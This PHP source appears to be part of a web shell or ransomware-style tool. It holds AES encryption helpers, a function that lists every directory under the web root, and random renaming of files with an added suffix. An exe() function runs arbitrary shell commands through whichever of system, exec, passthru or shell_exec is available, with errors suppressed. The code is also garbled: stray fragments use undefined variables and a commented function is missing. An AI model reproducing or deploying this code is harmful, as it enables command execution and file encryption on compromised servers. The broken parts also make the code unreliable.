// Encryption function
function encryptData($dt, $ky, $iv) {
    $ci = 'AES-256-CBC';
    $op = 0;
    $salt = openssl_random_pseudo_bytes(16);
    $ed = openssl_encrypt($dt, $ci, $ky, $op, $iv);
    
    if ($ed === false) {
        return false;
    }
    
    $ed_base64 = base64_encode($iv . $salt . $ed);
    return strtr($ed_base64, '+/=', '-_,');
}

// Decryption function
function decryptData($dt, $ky) {
    $ci = 'AES-256-CBC';
    $op = 0;
    
    $cd = base64_decode(strtr($dt, '-_,', '+/='));
    $iv = substr($cd, 0, 16);
    $salt = substr($cd, 16, 16); 
    $df = substr($cd, 32); 
    $dd = openssl_decrypt($df, $ci, $ky, $op, $iv);
    
    if ($dd === false) {
        return false;
    }
    
    return $dd;
}

// Get list of directories
function getDirectoryList() {
    $dirs = [];
    $root = $_SERVER['DOCUMENT_ROOT'];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($iterator as $item) {
        if ($item->isDir()) {
            $dirs[] = $item->getRealPath();
        }
    }
    return $dirs;
}

// Generate random filename
function generateRandomFilename($originalPath, $suffix) {
    $pathInfo = pathinfo($originalPath);
    $randomName = bin2hex(random_bytes(8));
    return $pathInfo['dirname'] . '/' . $randomName . '.' . $pathInfo['extension'] . '.' . $suffix;
}

// Validate filename

function hdd($s)
{
	if ($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824) . ' GB';
	elseif ($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576) . ' MB';
	elseif ($s >= 1024)
		return sprintf('%1.2f', $s / 1024) . ' KB';
	else
		return $s . ' B';
}

{
	if (strpos($param, $kata1) === FALSE) return FALSE;

function exe($cmd)
{
	if (function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

		$n = '';

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
